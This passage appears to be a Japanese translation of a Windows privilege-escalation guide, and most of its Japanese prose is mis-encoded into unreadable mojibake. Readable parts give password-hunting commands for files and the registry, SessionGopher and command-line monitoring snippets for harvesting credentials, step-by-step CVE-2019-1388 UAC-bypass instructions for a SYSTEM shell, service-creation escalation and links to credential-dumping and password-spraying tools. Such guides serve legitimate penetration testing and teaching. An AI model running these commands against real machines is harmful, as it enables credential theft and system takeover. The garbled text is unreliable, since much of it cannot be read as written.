æ”»æ’ƒè€…ãŒCOMãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã‚’æ°¸ç¶šåŒ–ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¨ã—ã¦ã©ã®ã‚ˆã†ã«ä½¿ç”¨ã™ã‚‹ã‹ã‚’å­¦ã¶ã«ã¯ã€ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **ãƒ•ã‚¡ã‚¤ãƒ«ã¨ãƒ¬ã‚¸ã‚¹ãƒˆãƒªå†…ã®ä¸€èˆ¬çš„ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰æ¤œç´¢**

**ãƒ•ã‚¡ã‚¤ãƒ«å†…å®¹ã®æ¤œç´¢**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**ç‰¹å®šã®ãƒ•ã‚¡ã‚¤ãƒ«åã‚’æŒã¤ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ¤œç´¢ã™ã‚‹**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚’æ¤œç´¢ã—ã¦ã‚­ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¢ã™**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¤œç´¢ã™ã‚‹ãƒ„ãƒ¼ãƒ«

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ã¯ç§ãŒä½œæˆã—ãŸmsfãƒ—ãƒ©ã‚°ã‚¤ãƒ³**ã§ã€è¢«å®³è€…ã®ä¸­ã§è³‡æ ¼æƒ…å ±ã‚’æ¤œç´¢ã™ã‚‹ã™ã¹ã¦ã®metasploit POSTãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’è‡ªå‹•çš„ã«å®Ÿè¡Œã™ã‚‹ã‚ˆã†ã«è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™ã€‚\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) ã¯ã€ã“ã®ãƒšãƒ¼ã‚¸ã«è¨˜è¼‰ã•ã‚Œã¦ã„ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å«ã‚€ã™ã¹ã¦ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è‡ªå‹•çš„ã«æ¤œç´¢ã—ã¾ã™ã€‚\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ã¯ã‚·ã‚¹ãƒ†ãƒ ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŠ½å‡ºã™ã‚‹ãŸã‚ã®åˆ¥ã®å„ªã‚ŒãŸãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

ãƒ„ãƒ¼ãƒ«[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) ã¯ã€ã“ã®ãƒ‡ãƒ¼ã‚¿ã‚’å¹³æ–‡ã§ä¿å­˜ã™ã‚‹è¤‡æ•°ã®ãƒ„ãƒ¼ãƒ«ï¼ˆPuTTYã€WinSCPã€FileZillaã€SuperPuTTYã€ãŠã‚ˆã³RDPï¼‰ã®**ã‚»ãƒƒã‚·ãƒ§ãƒ³**ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚’æ¤œç´¢ã—ã¾ã™ã€‚
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## ãƒªãƒ¼ã‚¯ã—ãŸãƒãƒ³ãƒ‰ãƒ©

**SYSTEMã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ãŒã€å®Œå…¨ãªã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã§æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ã‚’é–‹ã**ï¼ˆ`OpenProcess()`ï¼‰ã¨ã—ã¾ã™ã€‚åŒã˜ãƒ—ãƒ­ã‚»ã‚¹ãŒ**ä½ã„ç‰¹æ¨©ã§æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹**ï¼ˆ`CreateProcess()`ï¼‰**ã‚’ä½œæˆã—ã€ãŸã ã—ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã®ã™ã¹ã¦ã®ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ³ãƒ‰ãƒ«ã‚’ç¶™æ‰¿ã—ã¾ã™**ã€‚\
ãã®å¾Œã€**ä½ã„ç‰¹æ¨©ã‚’æŒã¤ãƒ—ãƒ­ã‚»ã‚¹ã«å®Œå…¨ãªã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ãŒã‚ã‚‹å ´åˆ**ã€`OpenProcess()`ã§ä½œæˆã•ã‚ŒãŸ**ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã¸ã®ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ³ãƒ‰ãƒ«ã‚’å–å¾—ã—ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆ**ã§ãã¾ã™ã€‚\
[ã“ã®è„†å¼±æ€§ã‚’**æ¤œå‡ºãŠã‚ˆã³æ‚ªç”¨ã™ã‚‹æ–¹æ³•**ã«ã¤ã„ã¦è©³ç´°ã‚’èª­ã‚€ã«ã¯ã“ã¡ã‚‰ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚](leaked-handle-exploitation.md)\
[ç•°ãªã‚‹æ¨©é™ãƒ¬ãƒ™ãƒ«ã§ç¶™æ‰¿ã•ã‚ŒãŸãƒ—ãƒ­ã‚»ã‚¹ãŠã‚ˆã³ã‚¹ãƒ¬ãƒƒãƒ‰ã®ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ³ãƒ‰ãƒ©ã‚’ãƒ†ã‚¹ãƒˆãŠã‚ˆã³æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã®**è©³ç´°ãªèª¬æ˜ã«ã¤ã„ã¦ã¯ã€ã“ã®ä»–ã®æŠ•ç¨¿ã‚’èª­ã‚“ã§ãã ã•ã„**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## åå‰ä»˜ããƒ‘ã‚¤ãƒ—ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®æ¨©é™æ˜‡æ ¼

**ãƒ‘ã‚¤ãƒ—**ã¨ã—ã¦å‚ç…§ã•ã‚Œã‚‹å…±æœ‰ãƒ¡ãƒ¢ãƒªã‚»ã‚°ãƒ¡ãƒ³ãƒˆã¯ã€ãƒ—ãƒ­ã‚»ã‚¹é–“ã®é€šä¿¡ã¨ãƒ‡ãƒ¼ã‚¿è»¢é€ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

Windowsã«ã¯**Named Pipes**ã¨å‘¼ã°ã‚Œã‚‹æ©Ÿèƒ½ãŒã‚ã‚Šã€é–¢é€£ã®ãªã„ãƒ—ãƒ­ã‚»ã‚¹ãŒç•°ãªã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’ä»‹ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’å…±æœ‰ã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€**åå‰ä»˜ããƒ‘ã‚¤ãƒ—ã‚µãƒ¼ãƒ**ã¨**åå‰ä»˜ããƒ‘ã‚¤ãƒ—ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ**ã¨ã—ã¦å®šç¾©ã•ã‚ŒãŸå½¹å‰²ã‚’æŒã¤ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ/ã‚µãƒ¼ãƒã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã«ä¼¼ã¦ã„ã¾ã™ã€‚

**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ**ãŒãƒ‘ã‚¤ãƒ—ã‚’ä»‹ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã™ã‚‹ã¨ã€ãƒ‘ã‚¤ãƒ—ã‚’è¨­å®šã—ãŸ**ã‚µãƒ¼ãƒ**ã¯ã€å¿…è¦ãª**SeImpersonate**æ¨©é™ã‚’æŒã£ã¦ã„ã‚Œã°ã€**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ**ã®**ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’å¼•ãç¶™ã**èƒ½åŠ›ã‚’æŒã¡ã¾ã™ã€‚ç¢ºç«‹ã—ãŸãƒ‘ã‚¤ãƒ—ã‚’ä»‹ã—ã¦ã‚„ã‚Šå–ã‚Šã™ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’æ¨¡å€£ã§ãã‚‹**ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹**ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ã§ã€ãã®ãƒ—ãƒ­ã‚»ã‚¹ãŒè¨­å®šã—ãŸãƒ‘ã‚¤ãƒ—ã¨ã‚„ã‚Šå–ã‚Šã™ã‚‹ã¨ãã«ã€ãã®ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’å–å¾—ã™ã‚‹ã“ã¨ã§ã€**é«˜ã„ç‰¹æ¨©ã‚’ç²å¾—**ã™ã‚‹æ©Ÿä¼šãŒæä¾›ã•ã‚Œã¾ã™ã€‚ã“ã®ã‚ˆã†ãªæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹æ‰‹é †ã«ã¤ã„ã¦ã¯ã€[ã“ã¡ã‚‰](named-pipe-client-impersonation.md)ã¨[ã“ã¡ã‚‰](./#from-high-integrity-to-system)ã§å½¹ç«‹ã¤ã‚¬ã‚¤ãƒ‰ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ã€‚

ã¾ãŸã€æ¬¡ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**burpãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦åå‰ä»˜ããƒ‘ã‚¤ãƒ—é€šä¿¡ã‚’å‚å—**ã§ãã¾ã™ï¼š[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ã¾ãŸã€ã“ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã™ã¹ã¦ã®ãƒ‘ã‚¤ãƒ—ã‚’ãƒªã‚¹ãƒˆãŠã‚ˆã³è¡¨ç¤ºã—ã¦ç‰¹æ¨©æ˜‡æ ¼ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼š[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## ãã®ä»–

### **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ç›£è¦–ã™ã‚‹ãŸã‚ã®ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã®ç›£è¦–**

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹ã¨ã€ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚„ä»–ã®ãƒ—ãƒ­ã‚»ã‚¹ãŒå®Ÿè¡Œã•ã‚Œã€**ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã§è³‡æ ¼æƒ…å ±ãŒæ¸¡ã•ã‚Œã‚‹**å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚’2ç§’ã”ã¨ã«ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã€ç¾åœ¨ã®çŠ¶æ…‹ã¨å‰ã®çŠ¶æ…‹ã‚’æ¯”è¼ƒã—ã¦ã€é•ã„ãŒã‚ã‚Œã°å‡ºåŠ›ã—ã¾ã™ã€‚
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## ãƒ—ãƒ­ã‚»ã‚¹ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ç›—ã‚€

## ä½ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰NT\AUTHORITY SYSTEMã¸ï¼ˆCVE-2019-1388ï¼‰/ UAC ãƒã‚¤ãƒ‘ã‚¹

ã‚°ãƒ©ãƒ•ã‚£ã‚«ãƒ«ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆï¼ˆã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã¾ãŸã¯RDPçµŒç”±ï¼‰ã‹ã¤UACãŒæœ‰åŠ¹ãªå ´åˆã€ä¸€éƒ¨ã®Microsoft Windowsãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã¯ã€ç‰¹æ¨©ã®ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã‚¿ãƒ¼ãƒŸãƒŠãƒ«ã‚„ä»–ã®ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆä¾‹ï¼šã€ŒNT\AUTHORITY SYSTEMã€ï¼‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

ã“ã‚Œã«ã‚ˆã‚Šã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã€åŒæ™‚ã«UACã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã•ã‚‰ã«ã€ä½•ã‚‚ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹å¿…è¦ã¯ãªãã€ãƒ—ãƒ­ã‚»ã‚¹ä¸­ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒã‚¤ãƒŠãƒªã¯ã€Microsoftã«ã‚ˆã£ã¦ç½²åã•ã‚Œã¦ã„ã¾ã™ã€‚

å½±éŸ¿ã‚’å—ã‘ã‚‹ã‚·ã‚¹ãƒ†ãƒ ã®ä¸€éƒ¨ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Then **read this to learn about UAC and UAC bypasses:**

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **pass to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

**ãƒã‚¤ã‚¤ãƒ³ãƒ†ã‚°ãƒªãƒ†ã‚£ãƒ—ãƒ­ã‚»ã‚¹ã‹ã‚‰ã€AlwaysInstallElevatedãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚¨ãƒ³ãƒˆãƒªã‚’æœ‰åŠ¹ã«ã—ã¦ã€.msiãƒ©ãƒƒãƒ‘ãƒ¼ã‚’ä½¿ç”¨ã—ã¦é€†ã‚·ã‚§ãƒ«ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
[é–¢é€£ã™ã‚‹ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ã¨.msiãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ–¹æ³•ã«ã¤ã„ã¦ã®è©³ç´°ã¯ã“ã¡ã‚‰ã€‚](./#alwaysinstallelevated)

### High + SeImpersonateæ¨©é™ã‚’Systemã«

**[ã“ã¡ã‚‰ã§ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™](seimpersonate-from-high-to-system.md)**ã€‚

### SeDebug + SeImpersonateã‹ã‚‰Full Tokenæ¨©é™ã¸

ã“ã‚Œã‚‰ã®ãƒˆãƒ¼ã‚¯ãƒ³æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆï¼ˆãŠãã‚‰ãã™ã§ã«High Integrityãƒ—ãƒ­ã‚»ã‚¹ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã§ã—ã‚‡ã†ï¼‰ã€SeDebugæ¨©é™ã‚’æŒãŸãªã„ãƒ—ãƒ­ã‚»ã‚¹ã‚’é™¤ã„ã¦ã€ã»ã¨ã‚“ã©ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’é–‹ãã“ã¨ãŒã§ãã€ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã‚³ãƒ”ãƒ¼ã—ã€ãã®ãƒˆãƒ¼ã‚¯ãƒ³ã§ä»»æ„ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€é€šå¸¸ã¯ã™ã¹ã¦ã®ãƒˆãƒ¼ã‚¯ãƒ³æ¨©é™ã‚’æŒã¤SYSTEMã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ãŒé¸æŠã•ã‚Œã¾ã™ï¼ˆã¯ã„ã€ã™ã¹ã¦ã®ãƒˆãƒ¼ã‚¯ãƒ³æ¨©é™ã‚’æŒãŸãªã„SYSTEMãƒ—ãƒ­ã‚»ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼‰ã€‚\
[ææ¡ˆã•ã‚ŒãŸãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ã‚³ãƒ¼ãƒ‰ã®ä¾‹ã¯ã“ã¡ã‚‰ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™](sedebug-+-seimpersonate-copy-token.md)**ã€‚**

### Named Pipes

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€`getsystem`ã§ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ãŸã‚ã«meterpreterã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€**ãƒ‘ã‚¤ãƒ—ã‚’ä½œæˆã—ã€ãã®ãƒ‘ã‚¤ãƒ—ã«æ›¸ãè¾¼ã‚€ãŸã‚ã«ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä½œæˆ/æ‚ªç”¨ã™ã‚‹**ã“ã¨ã§æ§‹æˆã•ã‚Œã¾ã™ã€‚ãã®å¾Œã€**SeImpersonate**æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ãƒ‘ã‚¤ãƒ—ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼ˆã‚µãƒ¼ãƒ“ã‚¹ï¼‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’**å½è£…**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹**ã‚µãƒ¼ãƒãƒ¼**ã¯ã€SYSTEMæ¨©é™ã‚’å–å¾—ã—ã¾ã™ã€‚\
[åå‰ä»˜ããƒ‘ã‚¤ãƒ—ã«ã¤ã„ã¦è©³ã—ãå­¦ã³ãŸã„å ´åˆã¯ã€ã“ã¡ã‚‰ã‚’èª­ã‚“ã§ãã ã•ã„](./#named-pipe-client-impersonation)ã€‚\
[é«˜ã‚¤ãƒ³ãƒ†ã‚°ãƒªãƒ†ã‚£ã‹ã‚‰Systemã«ç§»è¡Œã™ã‚‹æ–¹æ³•ã®ä¾‹ã«ã¤ã„ã¦ã¯ã€ã“ã¡ã‚‰ã‚’èª­ã‚“ã§ãã ã•ã„](from-high-integrity-to-system-with-name-pipes.md)ã€‚

### Dll Hijacking

**SYSTEM**ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**ãƒ—ãƒ­ã‚»ã‚¹**ã«ã‚ˆã£ã¦**ãƒ­ãƒ¼ãƒ‰**ã•ã‚Œã¦ã„ã‚‹**dllã‚’ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯**ã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€ãã®æ¨©é™ã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€Dll Hijackingã¯ã“ã®ç¨®ã®ç‰¹æ¨©æ˜‡æ ¼ã«ã‚‚å½¹ç«‹ã¡ã¾ã™ã€‚ã•ã‚‰ã«ã€ãƒã‚¤ã‚¤ãƒ³ãƒ†ã‚°ãƒªãƒ†ã‚£ãƒ—ãƒ­ã‚»ã‚¹ã‹ã‚‰ã¯ã€dllã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ•ã‚©ãƒ«ãƒ€ã«**æ›¸ãè¾¼ã¿æ¨©é™**ãŒã‚ã‚‹ãŸã‚ã€**ã¯ã‚‹ã‹ã«ç°¡å˜ã«é”æˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
[Dllãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã«ã¤ã„ã¦è©³ã—ãã¯ã“ã¡ã‚‰ã‚’å‚ç…§ã—ã¦ãã ã•ã„](dll-hijacking/)ã€‚

### ç®¡ç†è€…ã¾ãŸã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã‹ã‚‰Systemã¸

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICEã¾ãŸã¯NETWORK SERVICEã‹ã‚‰ãƒ•ãƒ«æ¨©é™ã¸

**å‚ç…§:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## ãã®ä»–ã®ãƒ˜ãƒ«ãƒ—

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## ä¾¿åˆ©ãªãƒ„ãƒ¼ãƒ«

**Windowsãƒ­ãƒ¼ã‚«ãƒ«ç‰¹æ¨©æ˜‡æ ¼ãƒ™ã‚¯ã‚¿ãƒ¼ã‚’æ¢ã™ãŸã‚ã®æœ€é«˜ã®ãƒ„ãƒ¼ãƒ«:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- è¨­å®šãƒŸã‚¹ã¨æ©Ÿå¯†ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒã‚§ãƒƒã‚¯ï¼ˆ**[**ã“ã¡ã‚‰ã‚’ç¢ºèª**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**ï¼‰ã€‚æ¤œå‡ºã•ã‚Œã¾ã—ãŸã€‚**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- ã„ãã¤ã‹ã®å¯èƒ½ãªè¨­å®šãƒŸã‚¹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€æƒ…å ±ã‚’åé›†ï¼ˆ**[**ã“ã¡ã‚‰ã‚’ç¢ºèª**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**ï¼‰ã€‚**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- è¨­å®šãƒŸã‚¹ã‚’ãƒã‚§ãƒƒã‚¯**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTYã€WinSCPã€SuperPuTTYã€FileZillaã€ãŠã‚ˆã³RDPã®ä¿å­˜ã•ã‚ŒãŸã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±ã‚’æŠ½å‡ºã—ã¾ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ã§ -Thorough ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- è³‡æ ¼æƒ…å ±ã‚’Credential Managerã‹ã‚‰æŠ½å‡ºã—ã¾ã™ã€‚æ¤œå‡ºã•ã‚Œã¾ã—ãŸã€‚**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- åé›†ã—ãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒ‰ãƒ¡ã‚¤ãƒ³å…¨ä½“ã«ã‚¹ãƒ—ãƒ¬ãƒ¼ã—ã¾ã™**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveighã¯PowerShell ADIDNS/LLMNR/mDNS/NBNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚¡ãƒ¼ãŠã‚ˆã³ä¸­é–“è€…ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- åŸºæœ¬çš„ãªç‰¹æ¨©æ˜‡æ ¼Windowsåˆ—æŒ™**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- æ—¢çŸ¥ã®ç‰¹æ¨©æ˜‡æ ¼è„†å¼±æ€§ã‚’æ¤œç´¢ï¼ˆWatsonã®ãŸã‚ã«éæ¨å¥¨ï¼‰\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚§ãƒƒã‚¯ **ï¼ˆç®¡ç†è€…æ¨©é™ãŒå¿…è¦ï¼‰**

**Exe**

